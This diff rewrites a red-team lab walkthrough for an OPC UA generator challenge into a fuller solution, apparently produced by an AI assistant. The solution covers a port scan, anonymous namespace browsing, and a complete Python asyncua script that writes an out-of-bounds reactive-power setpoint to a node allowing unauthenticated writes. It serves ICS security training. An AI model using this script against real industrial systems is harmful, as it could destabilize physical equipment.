@@ -1,25 +1,61 @@
-# Red Team Lab Walkthrough: Generator Reactive-Power Setpoint Write
+Viewed service_availability_ttp.yaml:1-22
+Viewed Red-Writeup.md:1-25
 
-## 1. Discovery and Enumeration
-1. **Identify the Service:** Run a port scan to locate the OPC UA service.
-   `nmap -p 4840 127.0.0.1`
-   *Result:* Port 4840 is open.
-2. **Browse the Namespace:** Use an OPC UA client (like UA Expert or `asyncua` scripts) to enumerate the tree. Navigate to `Objects -> Generator1`.
-3. **Analyze Nodes:** You will see various nodes: `ActivePower`, `Voltage`, `FieldExcitationCurrent`, `RotorSpeed`, and `ReactivePowerSetpoint`.
+Here is the complete, step-by-step solution for Challenge 6 (**Generator Reactive-Power Setpoint**). 
 
-## 2. Identify the Target
-1. Note that nodes like `ActivePower` and `Voltage` are standard read-only parameters.
-2. The parameter `ReactivePowerSetpoint` manages process intent. 
-3. Verify access levels: By attempting to connect anonymously and reading the `UserAccessLevel` attribute (or attempting a test write), confirm that `ReactivePowerSetpoint` allows unauthenticated writes.
+This challenge focuses on the **OPC UA** protocol, which is a modern, highly popular ICS communication standard.
 
-## 3. Execution (T0836 - Modify Parameter)
-1. Read the current value of `ReactivePowerSetpoint` to establish the baseline.
-   *Result:* Current value is `10.0` Mvar.
-2. Write an out-of-policy value that exceeds standard operating bands (e.g., `75.0` Mvar) using the lab execution script. 
-   `bash red_attack.sh`
-3. The script connects asynchronously, retrieves `ns=2;i=5`, and pushes the new `DataValue`.
+### Step 1: Network Discovery (Scanning for OPC UA)
+First, the participant scans the network to locate the industrial service. OPC UA almost always runs on TCP port 4840.
+```bash
+nmap -p 4840 127.0.0.1
+```
+*Result:* Port 4840 is confirmed to be open.
 
-## 4. Confirmation
-1. Read the node value again to verify the write persisted.
-2. The server-side logic will evaluate the parameter deviation (>15.0 Mvar). 
-3. **Scoring Condition Met:** The variable is modified outside the approved band, triggering the process deviation alarm in the backend.
+### Step 2: Namespace Enumeration
+Unlike older protocols (like Modbus or DNP3) that just use raw memory addresses, OPC UA has a rich, human-readable directory structure (called a "Namespace"). 
+
+Participants use an OPC UA client (like the GUI tool *UaExpert* or a Python `asyncua` script) to connect to `opc.tcp://127.0.0.1:4840` without credentials (Anonymous Login). 
+
+They browse the directory tree and navigate to `Objects -> Generator1`. Inside, they see several variables (nodes):
+* `ActivePower`
+* `Voltage`
+* `FieldExcitationCurrent`
+* `RotorSpeed`
+* `ReactivePowerSetpoint`
+
+### Step 3: Identify the Vulnerability
+The participant attempts to read/write to these nodes. They will discover:
+1. `Voltage` and `ActivePower` are Read-Only (attempting to write to them will fail).
+2. The `ReactivePowerSetpoint` node (specifically Node ID: `ns=2;i=5`) manages how the generator handles power load.
+3. Crucially, the server is misconfigured: **It allows unauthenticated users to Write to the ReactivePowerSetpoint.**
+
+### Step 4: Execution (The Attack)
+The normal baseline for the Reactive Power Setpoint is around `10.0 Mvar`. To successfully attack the system, the participant must write a massive, out-of-bounds value (e.g., `75.0 Mvar`) to that node to destabilize the generator.
+
+Using a Python `asyncua` script (or a GUI client), they execute the payload:
+```python
+import asyncio
+from asyncua import Client
+
+async def attack():
+    # Connect to the vulnerable OPC UA Server
+    client = Client("opc.tcp://127.0.0.1:4840")
+    await client.connect()
+
+    # Target the ReactivePowerSetpoint Node (Namespace 2, Index 5)
+    target_node = client.get_node("ns=2;i=5")
+    
+    # Inject the malicious 75.0 Mvar Setpoint
+    await target_node.write_value(75.0)
+    print("Malicious setpoint injected!")
+    
+    await client.disconnect()
+
+asyncio.run(attack())
+```
+
+### Step 5: Verification
+As soon as the malicious setpoint (`75.0`) is pushed to the server, the server-side logic detects the massive parameter deviation (> 15.0 Mvar) and triggers the backend alarm. 
+
+**Challenge Completed!**
